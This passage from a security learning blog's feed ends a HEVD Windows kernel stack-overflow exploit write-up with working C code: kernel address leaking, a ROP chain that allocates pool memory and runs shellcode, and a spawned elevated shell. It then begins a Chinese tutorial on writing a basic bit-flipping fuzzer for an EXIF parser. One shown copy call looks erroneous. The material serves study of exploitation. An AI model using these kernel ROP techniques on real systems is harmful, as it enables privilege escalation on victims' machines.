<span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">get_kernel_symbol_addr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* symbol, PVOID ntbase)</span> &#123;</span><br><span class="line">  PVOID kernelBaseAddr;</span><br><span class="line">  HMODULE userKernelHandle;</span><br><span class="line">  PCHAR functionAddress;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line"></span><br><span class="line">  kernelBaseAddr = ntbase;  <span class="comment">// Loads kernel base address</span></span><br><span class="line">  userKernelHandle = LoadLibraryA(<span class="string">&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;</span>);  <span class="comment">// Gets kernel binary</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (userKernelHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  <span class="comment">// Finds given symbol</span></span><br><span class="line">  <span class="keyword">if</span> (functionAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// Could not find symbol</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  offset = functionAddress - ((PCHAR)userKernelHandle);  <span class="comment">// Subtracts the loaded binary&#x27;s base address from the found address. This way, we will find the offset of the symbol for base address 0.</span></span><br><span class="line">  <span class="keyword">return</span> (PVOID)(((PCHAR)kernelBaseAddr) + offset);  <span class="comment">// Adds the offset to the leaked base address.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> add_rsp_20h_ret = ntBase + <span class="number">0xa1b718</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx_ret = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rdx_ret = ntBase + <span class="number">0x4e13ce</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> push_rax_pop_r13_ret = ntBase + <span class="number">0x5b6164</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> xchg_r8_r13_ret = ntBase + <span class="number">0x2714f6</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_rcx_r8_mov_rax_rcx_ret = ntBase + <span class="number">0x94133a</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_r8_ret = ntBase + <span class="number">0x201861</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> jmp_rax = ntBase + <span class="number">0x24b024</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_exallocatepoolwithtag = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;ExAllocatePoolWithTag&quot;</span>, ntBase);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_memcpy = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;memcpy&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">19</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, bufSize, <span class="number">145</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = pop_rcx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_exallocatepoolwithtag;</span><br><span class="line">  *(rop + index++) = add_rsp_20h_ret;</span><br><span class="line">  index += <span class="number">4</span>;</span><br><span class="line">  *(rop + index++) = push_rax_pop_r13_ret;</span><br><span class="line">  *(rop + index++) = xchg_r8_r13_ret;</span><br><span class="line">  *(rop + index++) = mov_rcx_r8_mov_rax_rcx_ret;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(&amp;shellcode);</span><br><span class="line">  *(rop + index++) = pop_r8_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_memcpy;</span><br><span class="line">  *(rop + index++) = jmp_rax;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation - HEVD x64 Stack Overflow | xct’s blog</a></p><p><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10 RS5 x64 | Kristal’s Notebook</a></p><p><a href="https://wonderkun.cc/2021/08/22/windows10内核态提权方法汇总/">windows10内核态提权方法汇总 | wonderkun’s | blog</a></p><p><a href="https://mdanilor.github.io/posts/hevd-3/">[Cracking Windows Kernel with HEVD] Chapter 3: Can we rop our way into triggering our shellcode?</a></p><p><a href="https://ommadawn46.hatenablog.com/entry/2024/01/30/101340">Windows 10 22H2 - HEVDで学ぶKernel Exploit - ommadawn46’s blog</a></p>]]></content>
    
    
    <summary type="html">dddd</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="HEVD" scheme="https://ixout.github.io/tags/HEVD/"/>
    
  </entry>
  
  <entry>
    <title>code a baby fuzzer</title>
    <link href="https://ixout.github.io/posts/40120/"/>
    <id>https://ixout.github.io/posts/40120/</id>
    <published>2024-12-29T08:13:45.000Z</published>
    <updated>2025-01-07T14:29:46.574Z</updated>
    
    <content type="html"><![CDATA[<p>fuzzer应该是二进制安全学习者的必修项目,互联网上开源可供使用的fuzzer成百上千,专品精品应有尽有,但没什么比自己动手写一个fuzzer更好的学习方法了</p><p>这里跟随国外的<a href="https://h0mbre.github.io/">h0mbre</a>大佬的<code>caveman</code>系列从一个最简单的fuzzer开始动手</p><h1 id="A-Simple-Start"><a href="#A-Simple-Start" class="headerlink" title="A Simple Start"></a>A Simple Start</h1><p>从写一个宝宝级的fuzzer开始</p><h2 id="STEPⅠ"><a href="#STEPⅠ" class="headerlink" title="STEPⅠ"></a>STEPⅠ</h2><p>以一个exif格式分析程序为目标程序<a href="https://github.com/mkttanabe/exif">mkttanabe/exif: simple implementation to access the Exif segment in the JPEG file</a>切入我们的fuzzer分析</p><p>那么有必要稍微了解一下带exif的jpg格式规范</p><p>exif是一种为数码相机照片设定的档案格式,可以存储拍摄出照片的部分信息</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/PixPin_2024-12-29_16-46-17.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/PixPin_2024-12-29_16-48-07.png" alt=""></p><p>可以知道图片二进制格式中0xffxx一般是作为元标志使用,特别是</p><ul><li>0xFFD8代表图片的开始,位于二进制格式的最前方</li><li>0xFFD9代表图片的结束,二进制的末尾必须有一个该标志</li></ul><p>以该仓库下的照片作为样本<a href="https://github.com/ianare/exif-samples/tree/master/jpg">exif-samples/jpg at master · ianare/exif-samples</a></p><h2 id="STEP-Ⅱ"><a href="#STEP-Ⅱ" class="headerlink" title="STEP Ⅱ"></a>STEP Ⅱ</h2><p>代码部分<code>h0mbre</code>一开始采用的是较为方便调试与理解的python进行开发,并在后续改为c/c++等编译型语言以提升性能,这里就直接用cpp了</p><p>首先是最基础的io</p><p>从文件中读取二进制格式,使用一个vector<char\>来模拟可变字节流</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">GetData</span><span class="params">(std::string filename)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary | std::ios::ate)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Cannot open &quot;</span> &lt;&lt; filename &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  std::streamsize size = file.<span class="built_in">tellg</span>();</span><br><span class="line">  <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">bytes</span><span class="params">(size)</span></span>;</span><br><span class="line"></span><br><span class="line">  file.<span class="built_in">seekg</span>(<span class="number">0</span>);</span><br><span class="line">  file.<span class="built_in">read</span>(bytes.<span class="built_in">data</span>(), size);</span><br><span class="line">  file.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BuildFile</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::ofstream <span class="title">file</span><span class="params">(<span class="string">&quot;mutated.jpg&quot;</span>, std::ios::binary | std::ios::trunc)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Cannot Create or Write to mutated.jpg&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    file.<span class="built_in">write</span>(data.<span class="built_in">data</span>(), data.<span class="built_in">size</span>());</span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Usage:baby_fuzzer [valid.jpg]&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::string filename = argv[<span class="number">1</span>];</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; origin_data = <span class="built_in">GetData</span>(filename);</span><br><span class="line">  <span class="built_in">BuildFile</span>(origin_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229194628.png" alt=""></p><h2 id="STEP-Ⅲ"><a href="#STEP-Ⅲ" class="headerlink" title="STEP Ⅲ"></a>STEP Ⅲ</h2><p>接下来是变异功能,一种最简单的变异实现是位翻转</p><p>对于一个字节的数据,我们随机的对其一个bit位进行翻转,当然也可以翻转更多,甚至对每个字节的翻转位数也可以是随机的,不过暂时我们只翻转一个比特位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RandomGenerator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">SetRange</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> min, <span class="type">unsigned</span> <span class="type">int</span> max)</span> </span>&#123;</span><br><span class="line">    dist = std::<span class="built_in">uniform_int_distribution</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;(min, max);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title">GetRandomNum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dist</span>(gen);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">RandomGenerator</span>() = <span class="keyword">delete</span>;</span><br><span class="line">  <span class="type">static</span> std::random_device rd;</span><br><span class="line">  <span class="type">static</span> std::mt19937 gen;</span><br><span class="line">  <span class="type">static</span> std::uniform_int_distribution&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; dist;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::random_device RandomGenerator::rd;</span><br><span class="line"><span class="function">std::mt19937 <span class="title">RandomGenerator::gen</span><span class="params">(RandomGenerator::rd())</span></span>;</span><br><span class="line"><span class="function">std::uniform_int_distribution&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; <span class="title">RandomGenerator::dist</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BitFlip</span><span class="params">(std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num_to_flip = std::<span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;((data.<span class="built_in">size</span>() - <span class="number">4</span>) * <span class="number">0.01</span>));</span><br><span class="line">  std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; victim_indexs;</span><br><span class="line">  victim_indexs.<span class="built_in">reserve</span>(num_to_flip);</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">2</span>, data.<span class="built_in">size</span>() - <span class="number">3</span>);<span class="comment">//do not edit soi and eoi</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_to_flip; ++i) &#123;</span><br><span class="line">    victim_indexs.<span class="built_in">emplace_back</span>(RandomGenerator::<span class="built_in">GetRandomNum</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; i : victim_indexs) &#123;</span><br><span class="line">    <span class="type">int</span> bit_index = RandomGenerator::<span class="built_in">GetRandomNum</span>();</span><br><span class="line">    data[i] = data[i] ^ (<span class="number">1</span> &lt;&lt; bit_index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂定修改1%的字节数</p><p>位翻转其实还是在一个较小的范围内变化,完全随机字节也许不错</p><h2 id="STEP-Ⅳ"><a href="#STEP-Ⅳ" class="headerlink" title="STEP Ⅳ"></a>STEP Ⅳ</h2><p>我们已经完成了一个变异方法,现在我们需要测试他</p><p>首先是一个运行测试程序的接口,通过caveman后续系列的文章,我们可以知道fork出一个子进程并用execve函数启动目标程序,是优于使用popen函数的,因为popen会额外生成一个shell</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunTest</span><span class="params">(<span class="type">int</span> counter, <span class="type">const</span> std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">BuildFile</span>(<span class="string">&quot;mutated.jpg&quot;</span>, data);</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;fork failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">dup2</span>(fd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(fd, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> args[] = &#123; <span class="string">&quot;./exif&quot;</span>, <span class="string">&quot;mutated.jpg&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="literal">nullptr</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">execve</span>(args[<span class="number">0</span>], args, <span class="literal">nullptr</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">      std::cerr &lt;&lt; <span class="string">&quot;execve failed: &quot;</span> &lt;&lt; errno &lt;&lt; std::endl;</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) &#123;</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;Process terminated with signal: &quot;</span> &lt;&lt; <span class="built_in">WTERMSIG</span>(status) &lt;&lt; std::endl;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">WTERMSIG</span>(status) == SIGSEGV) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Segmentation Fault detected!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::ostringstream oss;</span><br><span class="line">        oss &lt;&lt; <span class="string">&quot;crashes/crash_&quot;</span> &lt;&lt; counter &lt;&lt; <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="built_in">BuildFile</span>(oss.<span class="built_in">str</span>(), data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应地修改main</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Usage:baby_fuzzer [valid.jpg]&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">CrashDirExists</span>();</span><br><span class="line">  std::string filename = argv[<span class="number">1</span>];</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; origin_data = <span class="built_in">GetData</span>(filename);</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; mutated_data;</span><br><span class="line">  <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (counter &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    mutated_data = origin_data;</span><br><span class="line">    <span class="built_in">BitFlip</span>(mutated_data);</span><br><span class="line">    <span class="built_in">RunTest</span>(counter, mutated_data);</span><br><span class="line">    counter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229214119.png" alt=""></p><p>可以看到我们已经成功获得了crash,并且确实能够使得程序崩溃</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229214835.png" alt=""></p><p>在之后我们可以进一步分析它</p><h2 id="STEP-Ⅴ"><a href="#STEP-Ⅴ" class="headerlink" title="STEP Ⅴ"></a>STEP Ⅴ</h2><p>现在继续增加另一种变异方法:特殊值注入</p><p>在计算机中存在这么一些值往往更容易触发意料之外的操作</p><p>例如</p><ul><li>0xFF</li><li>0x7F</li><li>0x00</li><li>0xFFFF</li><li>0x0000</li><li>0xFFFFFFFF</li><li>0x00000000</li><li>0x80000000</li><li>0x40000000</li><li>0x7FFFFFFF</li></ul><p>那么我们接下来就往数据中随机插入数个这样的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; gMagicNums[] = &#123;</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0xff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0x7f</span>&#125;,</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">2</span>, <span class="number">0xffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span 